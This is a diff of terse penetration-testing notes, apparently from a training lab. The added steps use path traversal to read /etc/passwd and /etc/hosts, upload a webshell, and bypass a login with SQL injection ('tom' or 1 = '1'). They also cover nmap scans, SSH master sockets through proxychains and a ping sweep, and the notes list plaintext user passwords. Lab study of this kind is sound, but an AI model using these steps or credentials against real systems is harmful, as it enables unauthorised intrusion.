@@ -4,10 +4,26 @@
 MAKE THE MASTER SOCKET ON YOUR LIN OPS SINCE THERE IS NO JUMP BOX
 nmap <ip>
 nmap --script http-enum.nse 10.50.37.23 -p 80
+File to read: ../../../../../etc/passwd
+view page source so its easier to read 
+do like 3 or 4 or 5 (../)s
+../../../../../etc/hosts
+scan the network of the host found in /etc/hosts
 ssh with creds found in /scripts
+Upload image: upload webshell
+You need to upload and get to directory 
+Contact information: Not much use
+
+admin profile
+tom' or 1 = '1 pass and username
+f12, go to network -> html -> request, copy the stuff found
+link.#.#.#?<paste stuff found >
+paste into schyber schef, rot13 or base64
+
 
 Place second Master Socket onto Target and proxychains nmap 10.10.28.30
 ssh -MS /tmp/two user2@10.50.37.23
+
 
 /bin/bash
 for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
@@ -25,4 +41,7 @@ and found passwords. Passwords are either going to be in ROT13 or Base64, conver
 AARON: apasswordyPa$$word
 user2:EaglesIsARE78
 user3:Bob4THEEapples
+
+yeah just ssh in
+
 
